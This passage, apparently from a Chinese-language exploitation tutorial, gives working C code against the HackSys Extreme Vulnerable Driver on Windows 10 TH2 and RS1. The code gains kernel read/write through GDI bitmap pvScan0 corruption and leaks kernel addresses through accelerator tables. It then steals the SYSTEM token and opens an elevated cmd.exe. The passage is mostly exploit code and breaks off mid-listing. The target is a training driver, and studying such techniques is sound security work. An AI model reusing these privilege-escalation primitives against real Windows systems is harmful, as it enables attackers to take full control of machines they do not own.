        DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
        printf("    tebAddr: 0x%p\n", tebAddr);
        DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);
        printf("    pebAddr: 0x%p\n", pebAddr);
        DWORD64 GdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
        printf("    GdiSharedHandleTableAddr: 0x%p\n", GdiSharedHandleTableAddr);
        // GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针
        // GDICELL 结构体 x86 0x10,x64 0x18
        DWORD64 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD64)handle & 0xffff) * 0x18;
        printf("    pKernelAddress: 0x%p\n", pKernelAddress);
        DWORD64 surfaceObject = *(PDWORD64)pKernelAddress;
        printf("    surfaceObject address: 0x%p\n", surfaceObject);
        // BASEOBJECT 结构体 x86 0x10,x64 0x18
        // pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38
        DWORD64 pvScan0Address = surfaceObject + 0x18 + 0x38;
        printf("    pvScan0 address: 0x%p\n", pvScan0Address);
        return pvScan0Address;
    }
    VOID readOOB(HBITMAP hManager, HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
    {
        SetBitmapBits(hManager, len, &whereWrite); // set 写的是 hWorker 的 pvScan0 的值
                                                   // 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写
        GetBitmapBits(hWorker, len, whatWrite);
    }
    VOID writeOOB(HBITMAP hManager, HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
    {
        SetBitmapBits(hManager, len, &whereWrite);
        SetBitmapBits(hWorker, len, &whatWrite);
    }
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    int main() {
        HBITMAP hManager = CreateBitmap(0x64, 0x64, 1, 32, NULL);
        HBITMAP hWorker = CreateBitmap(0x64, 0x64, 1, 32, NULL);
        LPVOID lpSystemEPROCESS = NULL;
        DWORD len = 0;
        PSYSTEM_MODULE_INFORMATION  moduleInfo = NULL;
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        typedef struct _payload {
            PULONG what;
            PULONG where;
        } Payload, * PPayload;
        DWORD64 ManagerpvScan0Address = getpvScan0Address(hManager);
        //printf("manger pvscan0 address is  %p\n", ManagerpvScan0Address);
        DWORD64 WorkerpvScan0Address = getpvScan0Address(hWorker);
        //printf("worker pvscan0 address is  %p\n", WorkerpvScan0Address);
        PPayload  payload = (PPayload)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(Payload));
        payload->what = (PULONG)&WorkerpvScan0Address;
        payload->where = (PULONG)ManagerpvScan0Address;
        DWORD BytesReturned = 0;
        HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
        DeviceIoControl(hDevice, 0x0022200B, (LPVOID)payload, sizeof(Payload), NULL, 0, &BytesReturned, NULL);
        //__debugbreak();
        NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);
        LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
        //printf("aaaaaa\n");
        printf("[+]kernel name is: %s\n", lpkernelName);
        LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
        HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);
        FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");
        LPVOID lpSysProcID = NULL;
        LPVOID lpSystemToken = NULL;
        LIST_ENTRY lpNextEntryAddreess;
        FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);
        printf("addr              ======%p\n", pLiveFunctionAddress);
        readOOB(hManager, hWorker, (DWORD64)pLiveFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
        readOOB(hManager, hWorker, (DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2e8), &lpSysProcID, sizeof(LPVOID));
        readOOB(hManager, hWorker, (DWORD64)((PUCHAR)lpSystemEPROCESS + 0x358), &lpSystemToken, sizeof(LPVOID));
        readOOB(hManager, hWorker, (DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        printf("[+]system process address is: 0x%p\n", lpSystemEPROCESS);
        printf("[+]Next Process AT: 0x%p\n", lpNextEntryAddreess.Flink);
        printf("[+]system process token value is: 0x%p\n", lpSystemToken);
        printf("[+]system process PID is: 0x%p\n", lpSysProcID);
        DWORD64 currentProcessID = GetCurrentProcessId();
        printf("currentProcessID     ---->0x%x\n", currentProcessID);
        LPVOID lpNextEPROCESS = NULL;
        LPVOID lpCurrentPID = NULL;
        LPVOID lpCurrentToken = NULL;
        DWORD dwCurrentPID;
        do
        {
            lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2f0;
            readOOB(hManager, hWorker, (DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e8), &lpCurrentPID, sizeof(LPVOID));
            dwCurrentPID = LOWORD(lpCurrentPID);
            printf("dwCurrentPID     ---->0x%x\n", dwCurrentPID);
            readOOB(hManager, hWorker, (DWORD64)((PUCHAR)lpNextEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        } while (dwCurrentPID != currentProcessID);
        DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
        printf("[+]Start to write token");
        writeOOB(hManager, hWorker, currentTokenAddress, lpSystemToken, sizeof(LPVOID));
        printf(" => done!\n");
        CreateCmd();
        system("pause");
        return 0;
    }
可以看到最后是成功了的.
总结一下这次漏洞利用的过程:  
1.创建两个bitmap对象  
2.找到两个bitmap对象的pvScan0地址  
3.用漏洞改掉bitmap对象中pvScan0的值  
4.替换Token
## 0x04:RS1(win10_x64_1607)下的WWW
接下来我们来到RS1下的WWW.
我们直接拿着TH2下的exp运行,发现直接蓝屏了.
嗯?怎么回事?查阅资料后,你会发现[这个](//bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Flabs.bluefrostsecurity.de%2Ffiles%2FAbusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf):
哦,原来”Leaking kernel addresses by reading user32!gSharedInfo structure”被kill掉了.  
那么图中提到的 user32!gSharedInfo 是什么呢?我觉得可以对应上TH2下的这段代码
    DWORD64 getpvScan0Address(HBITMAP handle) {
        ......
    }
然后调试发现确实不能用了
那怎么办呢?记住一句话,攻与防从来都是相对的.  
先上图
看第二段,我们可以通过 AcceleratorTables 间接泄露.对应到这段代码:
        PUSER_HANDLE_ENTRY leakAddr = NULL;
        PSHAREDINFO gSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle("user32.dll"), "gSharedInfo");
        PUSER_HANDLE_ENTRY handleTable = gSharedInfo->aheList;
        int nSize = 698;
        LPACCEL lPaccel = NULL;
        // LPTR 意为 LMEM_FIXED | LMEM_ZEROINIT，即分配固定内存并初始化为 0
        lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * nSize);
        HACCEL hAccel_1 = NULL;
        hAccel_1 = CreateAcceleratorTable(lPaccel, nSize);
        leakAddr = &handleTable[LOWORD(hAccel_1)];
        DWORD64 hManagerAddr = (DWORD64)(leakAddr->pKernel);
        //printf("Manager bitmap addr: 0x%p\n", hManagerAddr);
        DestroyAcceleratorTable(hAccel_1);
        HBITMAP hManagerbitmap = CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL);
        HACCEL hAccel_2 = NULL;
        hAccel_2 = CreateAcceleratorTable(lPaccel, nSize);
        leakAddr = &handleTable[LOWORD(hAccel_2)];
        DWORD64 hWorkerAddr = (DWORD64)(leakAddr->pKernel);
        //printf("Worker bitmap addr: 0x%p\n", hWorkerAddr);
        DestroyAcceleratorTable(hAccel_2);
需要注意的是这里要定义很多结构体.  
泄露了地址之后,其他的就跟TH2下的利用一样了.代码贴贴:
    #include 
    #include
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
        IN ULONG ProfileSource,
        OUT PULONG Interval
        );
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    typedef struct _SERVERINFO {
        DWORD dwSRVIFlags;
        DWORD cHandleEntries;
        WORD wSRVIFlags;
        WORD wRIPPID;
        WORD wRIPError;
    } SERVERINFO, * PSERVERINFO;
    typedef struct _USER_HANDLE_ENTRY {
        void* pKernel;
        union
        {
            PVOID pi;
            PVOID pti;
            PVOID ppi;
        };
        BYTE type;
        BYTE flags;
        WORD generation;
    } USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;
    typedef struct _SHAREDINFO {
        PSERVERINFO psi;
        PUSER_HANDLE_ENTRY aheList;
        ULONG HeEntrySize;
        ULONG_PTR pDispInfo;
        ULONG_PTR ulSharedDelts;
        ULONG_PTR awmControl;
        ULONG_PTR DefWindowMsgs;
        ULONG_PTR DefWindowSpecMsgs;
    } SHAREDINFO, * PSHAREDINFO;
    typedef struct _payload {
        PULONG_PTR what;
        PULONG_PTR where;
    } Payload, * PPayload;
    VOID readOOB(HBITMAP hManager, HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
    {
        SetBitmapBits(hManager, len, &whereWrite); // set 写的是 hWorker 的 pvScan0 的值
                                                   // 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写
        GetBitmapBits(hWorker, len, whatWrite);
    }
    VOID writeOOB(HBITMAP hManager, HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
    {
        SetBitmapBits(hManager, len, &whereWrite);
        SetBitmapBits(hWorker, len, &whatWrite);
    }
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    int main()
    {
        PUSER_HANDLE_ENTRY leakAddr = NULL;
        PSHAREDINFO gSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle("user32.dll"), "gSharedInfo");
        PUSER_HANDLE_ENTRY handleTable = gSharedInfo->aheList;
        int nSize = 698;
        LPACCEL lPaccel = NULL;
        // LPTR 意为 LMEM_FIXED | LMEM_ZEROINIT，即分配固定内存并初始化为 0
        lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * nSize);
        HACCEL hAccel_1 = NULL;
        hAccel_1 = CreateAcceleratorTable(lPaccel, nSize);
        leakAddr = &handleTable[LOWORD(hAccel_1)];
        DWORD64 hManagerAddr = (DWORD64)(leakAddr->pKernel);
        //printf("Manager bitmap addr: 0x%p\n", hManagerAddr);
        DestroyAcceleratorTable(hAccel_1);
        HBITMAP hManagerbitmap = CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL);
        HACCEL hAccel_2 = NULL;
        hAccel_2 = CreateAcceleratorTable(lPaccel, nSize);
        leakAddr = &handleTable[LOWORD(hAccel_2)];
        DWORD64 hWorkerAddr = (DWORD64)(leakAddr->pKernel);
        //printf("Worker bitmap addr: 0x%p\n", hWorkerAddr);
        DestroyAcceleratorTable(hAccel_2);
        HBITMAP hWorkerbitmap = CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL);
        // ------我是分割线------    
        // 到这里我们已经获得 bitmap 的地址了，接下来就跟 RS1 之前一样利用 bitmap 就好了
        DWORD64 ManagerpvScan0Address = hManagerAddr + 0x18 + 0x38;
        printf("Manager pvScan0 Addr: 0x%p\n", ManagerpvScan0Address);
        DWORD64 WorkerpvScan0Address = hWorkerAddr + 0x18 + 0x38;
        printf("Worker pvScan0 Addr: 0x%p\n", WorkerpvScan0Address);
        PPayload payload = NULL;
        // malloc
        payload = (PPayload)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(Payload));
        payload->what = (PULONG_PTR)&WorkerpvScan0Address;
        payload->where = (PULONG_PTR)ManagerpvScan0Address;
        printf("payload---->what  %llX\n", payload->what);
        printf("payload->where    %llX\n", payload->where);
        DWORD BytesReturned = 0;
        HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
        DeviceIoControl(hDevice, 0x0022200B, (LPVOID)payload, sizeof(Payload), NULL, 0, &BytesReturned, NULL);
        // 已经 overwrite 了，接下来就是利用 SetBitmapBits 和 GetBitmapBits 来读写
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        PSYSTEM_MODULE_INFORMATION  moduleInfo = NULL;
        DWORD len = 0;
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        DWORD64 systemEprocessAddr = 0;
        LPVOID lpSystemToken = NULL; // 获取 system 进程的 token